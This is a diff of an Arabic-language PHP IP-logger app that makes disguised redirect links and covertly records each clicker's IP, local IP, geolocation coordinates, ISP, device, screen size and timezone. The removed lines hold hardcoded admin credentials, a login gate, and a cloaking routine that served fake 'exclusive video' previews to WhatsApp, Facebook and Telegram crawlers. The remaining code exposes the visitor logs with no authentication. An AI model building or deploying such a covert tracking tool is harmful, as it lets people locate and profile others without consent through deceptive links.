@@ -3,44 +3,17 @@
 ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
-session_start();
-
-$admin_user = "SCLC USER";
-$admin_pass = "aziz2000";
-
-// تسجيل الخروج
-if (isset($_GET['logout'])) {
-    session_destroy();
-    header("Location: /");
-    exit();
-}
-
-// معالجة تسجيل الدخول
-if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['login'])) {
-    if (isset($_POST['username']) and isset($_POST['password'])) {
-        if ($_POST['username'] === $admin_user and$_POST['password'] === $admin_pass) {$_SESSION['logged_in'] = true;
-            header("Location: /");
-            exit();
-        } else {
-            $login_error = "اسم المستخدم أو كلمة المرور غير صحيحة!";
-        }
-    }
-}
-
 try {
     $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-    // إنشاء جدول الروابط مع دعم حقول المعاينة
+    // إنشاء الجداول بحقول صحيحة ومحدثة
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
         target_url TEXT, 
-        preview_title TEXT,
-        preview_image TEXT,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
-    // إنشاء جدول السجلات
     $db->exec("CREATE TABLE IF NOT EXISTS logs (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT, 
@@ -61,8 +34,8 @@ try {
 }
 
 function get_real_ip() {
-    if (!empty($_SERVER['HTTP_X-FORWARDED-FOR'])) {
-        $ips = explode(',',$_SERVER['HTTP_X-FORWARDED-FOR']);
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ips = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
         return trim($ips[0]);
     }
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
@@ -103,41 +76,24 @@ function get_ip_details($ip) {
         return [
             'country' => $data['country'] ?? 'غير معروف',
             'city' => $data['city'] ?? 'غير معروف',
-            'lat' => $data['lat'] ?? '36.7538',              'lon' =>$data['lon'] ?? '3.0588',
+            'lat' => $data['lat'] ?? '36.7538',             'lon' =>$data['lon'] ?? '3.0588',
             'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
         ];
     }
     return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
 }
 
-// 1. معالجة إعادة التوجيه والتعرف على الروبوتات (فيسبوك وواتساب)
+// 1. معالجة إعادة التوجيه
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
-    $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
+    $stmt =$db->prepare("SELECT target_url FROM links WHERE code = ?");
     $stmt->execute([$code]);
     $link =$stmt->fetch(PDO::FETCH_ASSOC);
 
-    if ($link) {
-        $ua =$_SERVER['HTTP_USER_AGENT'] ?? '';
-        $is_bot = preg_match('/whatsapp\vert{}facebookexternalhit\vert{}twitterbot\vert{}telegrambot\vert{}embedly\vert{}quora link preview/i',$ua);
-
-        // إذا كان الزائر هو روبوت الفحص لتطبيقات الدردشة، أظهر له وسوم المعاينة فقط
-        if ($is_bot) {$title = !empty($link['preview_title']) ?$link['preview_title'] : 'فيديو حصري';
-            $img = !empty($link['preview_image']) ?$link['preview_image'] : 'https://via.placeholder.com/600x400';
-            
-            echo '<!DOCTYPE html><html><head>';
-            echo '<meta property="og:title" content="' . htmlspecialchars($title) . '">';
-            echo '<meta property="og:description" content="انقر للمشاهدة الآن">';
-            echo '<meta property="og:image" content="' . htmlspecialchars($img) . '">';
-            echo '<meta property="og:type" content="video.other">';
-            echo '</head><body></body></html>';
-            exit();
-        }
-
-        // الزائر الحقيقي: تسجيل البيانات والتوجيه للهدف
-        $target = $link['target_url'];$public_ip = get_real_ip();
+    if ($link) {$target = $link['target_url'];$public_ip = get_real_ip();
         $local_ip =$_GET['lip'] ?? 'غير متوفر';
         $geo = get_ip_details($public_ip);
+        $ua =$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
         $device = get_device_type($ua);
         $screen =$_GET['screen'] ?? 'غير متوفر';
         $tz =$_GET['tz'] ?? 'غير متوفر';
@@ -145,7 +101,9 @@ if (isset($_GET['r'])) {
         try {
             $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, country, city, lat, lon, isp, device_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
             $logStmt->execute([$code, $public_ip,$local_ip, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $screen,$tz]);
-        } catch (Exception $e) {}
+        } catch (Exception $e) {
+            // الاستمرار في حالة خطأ السجل
+        }
 
         header("Location: " . $target);
         exit();
@@ -154,63 +112,18 @@ if (isset($_GET['r'])) {
     }
 }
 
-// حماية لوحة التحكم: إذا لم يكن مسجلاً للدخول، أظهر نموذج الدخول
-if (!isset($_SESSION['logged_in']) or$_SESSION['logged_in'] !== true):
-?>
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - لوحة التحكم</title>
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
-        body { background-color: #0b0f19; color: #f3f4f6; display: flex; justify-content: center; align-items: center; height: 100vh; padding: 15px; }
-        .login-card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 30px; width: 100%; max-width: 400px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
-        h2 { color: #38bdf8; font-size: 20px; margin-bottom: 20px; text-align: center; }
-        .form-group { display: flex; flex-direction: column; gap: 12px; margin-bottom: 15px; }
-        input { background: #030712; border: 1px solid #374151; border-radius: 8px; padding: 12px; color: #fff; font-size: 14px; outline: none; }
-        input:focus { border-color: #38bdf8; }
-        button { background: #0284c7; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: background 0.2s; font-size: 15px; width: 100%; }
-        button:hover { background: #0369a1; }
-        .error { background: #7f1d1d; color: #fca5a5; padding: 10px; border-radius: 6px; font-size: 13px; margin-bottom: 15px; text-align: center; }
-    </style>
-</head>
-<body>
-    <div class="login-card">
-        <h2>🔒 تسجيل الدخول للوحة التحكم</h2>
-        <?php if (isset($login_error)): ?>
-            <div class="error"><?php echo $login_error; ?></div>
-        <?php endif; ?>
-        <form method="POST">
-            <div class="form-group">
-                <input type="text" name="username" placeholder="اسم المستخدم" required>
-                <input type="password" name="password" placeholder="كلمة المرور" required>
-                <button type="submit" name="login">دخول</button>
-            </div>
-        </form>
-    </div>
-</body>
-</html>
-<?php
-exit();
-endif;
-
-// 2. معالجة إنشاء رابط جديد بمعاينة مخصصة
+// 2. إنشاء رابط جديد
 $generated_link = "";
 $tracking_code = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
     $target_url = trim($_POST['target_url']);
-    $preview_title = trim($_POST['preview_title']);
-    $preview_image = trim($_POST['preview_image']);
-
     if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
         $target_url = "https://" . $target_url;
     }
 
     $code = substr(md5(uniqid(rand(), true)), 0, 7);
-    $stmt =$db->prepare("INSERT INTO links (code, target_url, preview_title, preview_image) VALUES (?, ?, ?, ?)");
-    $stmt->execute([$code,$target_url, $preview_title,$preview_image]);
+    $stmt =$db->prepare("INSERT INTO links (code, target_url) VALUES (?, ?)");
+    $stmt->execute([$code,$target_url]);
 
     $tracking_code =$code;
     $domain = $_SERVER['HTTP_HOST'];$generated_link = "https://" . $domain . "/?r=" . $code;
@@ -219,7 +132,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
 $total_links =$db->query("SELECT COUNT(*) FROM links")->fetchColumn();
 $total_visits =$db->query("SELECT COUNT(*) FROM logs")->fetchColumn();
 
-// جلب السجلات بناءً على فلتر الكود المدخل
 $filter_code = trim($_GET['track'] ?? '');
 if (!empty($filter_code)) {
     $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
@@ -234,7 +146,7 @@ if (!empty($filter_code)) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hello World from azez - لوحة التحكم</title>
+    <title>Hello World from azez</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         body { background-color: #0b0f19; color: #f3f4f6; padding: 15px; line-height: 1.5; }
@@ -242,14 +154,13 @@ if (!empty($filter_code)) {
         .card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
         .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
         h1 { color: #38bdf8; font-size: 22px; font-weight: 800; }
-        .stats-group { display: flex; gap: 10px; align-items: center; }
+        .stats-group { display: flex; gap: 10px; }
         .stat-box { background: #1f2937; padding: 8px 14px; border-radius: 8px; text-align: center; border: 1px solid #374151; }
         .stat-box span { display: block; font-size: 10px; color: #9ca3af; }
         .stat-box strong { font-size: 16px; color: #38bdf8; }
-        .logout-btn { background: #dc2626; padding: 8px 14px; font-size: 13px; border-radius: 8px; color: #fff; text-decoration: none; font-weight: bold; }
-        .logout-btn:hover { background: #b91c1c; }
         h2 { color: #38bdf8; font-size: 16px; margin-bottom: 12px; font-weight: 700; }
         .form-group { display: flex; flex-direction: column; gap: 10px; }
+        @media(min-width: 600px) { .form-group { flex-direction: row; } }
         input[type="text"] { flex: 1; background: #030712; border: 1px solid #374151; border-radius: 8px; padding: 12px; color: #fff; font-size: 14px; outline: none; width: 100%; }
         input[type="text"]:focus { border-color: #38bdf8; }
         button, .btn { background: #0284c7; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: background 0.2s; text-decoration: none; display: inline-block; text-align: center; font-size: 14px; white-space: nowrap; }
@@ -278,6 +189,8 @@ if (!empty($filter_code)) {
             if (redirectCode && !hasScreen) {
                 const screenRes = screen.width + "x" + screen.height;
                 const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                // التوجيه السريع مع إرسال الأبعاد والمنطقة الزمنية
                 window.location.href = `/?r=${redirectCode}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
             }
         });
@@ -301,7 +214,7 @@ if (!empty($filter_code)) {
         <div class="card header">
             <div>
                 <h1>Hello World from azez</h1>
-                <p style="color: #9ca3af; font-size: 12px; margin-top: 2px;">لوحة تحكم تتبع الروابط المتقدمة (فيسبوك وواتساب)</p>
+                <p style="color: #9ca3af; font-size: 12px; margin-top: 2px;">لوحة تحكم تتبع الروابط المتقدمة</p>
             </div>
             <div class="stats-group">
                 <div class="stat-box">
@@ -312,17 +225,14 @@ if (!empty($filter_code)) {
                     <span>النقرات</span>
                     <strong style="color: #34d399;"><?php echo $total_visits; ?></strong>
                 </div>
-                <a href="/?logout=1" class="logout-btn">خروج 🔓</a>
             </div>
         </div>
 
         <div class="card">
-            <h2>🔗 إنشاء رابط تتبع جديد بمعاينة مخصصة</h2>
+            <h2>🔗 إنشاء رابط تتبع جديد</h2>
             <form method="POST" class="form-group">
-                <input type="text" name="target_url" placeholder="الرابط المستهدف الحقيقي (مثال: youtube.com)" required>
-                <input type="text" name="preview_title" placeholder="عنوان المعاينة (اختياري)">
-                <input type="text" name="preview_image" placeholder="رابط صورة أو مصغرة الفيديو المباشرة (اختياري)">
-                <button type="submit" name="create" style="width: 100%;">توليد الرابط</button>
+                <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف (مثال: youtube.com)" required>
+                <button type="submit" name="create">توليد الرابط</button>
             </form>
 
             <?php if (!empty($generated_link)): ?>
@@ -347,7 +257,7 @@ if (!empty($filter_code)) {
             <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; margin-bottom: 10px;">
                 <h2>📊 سجلات الزيارات الحية</h2>
                 <form method="GET" style="display: flex; gap: 5px; margin: 0; width: 100%; max-width: 300px;">
-                    <input type="text" name="track" placeholder="بحث بكود التتبع القديم..." value="<?php echo htmlspecialchars($filter_code); ?>" style="padding: 8px; font-size: 12px;">
+                    <input type="text" name="track" placeholder="بحث بالكود..." value="<?php echo htmlspecialchars($filter_code); ?>" style="padding: 8px; font-size: 12px;">
                     <button type="submit" style="padding: 8px 12px; font-size: 12px;">بحث</button>
                     <?php if(!empty($filter_code)): ?>
                         <a href="/" class="btn" style="background: #dc2626; padding: 8px 10px; font-size: 12px;">إلغاء</a>
@@ -372,7 +282,7 @@ if (!empty($filter_code)) {
                     </thead>
                     <tbody>
                         <?php if (empty($logs)): ?>
-                            <tr><td colspan="9" style="text-align: center; color: #6b7280; padding: 25px;">لا توجد أي زيارات مسجلة لهذا الكود حتى الآن.</td></tr>
+                            <tr><td colspan="9" style="text-align: center; color: #6b7280; padding: 25px;">لا توجد أي زيارات مسجلة حتى الآن.</td></tr>
                         <?php else: ?>
                             <?php foreach ($logs as$log): ?>
                             <tr>
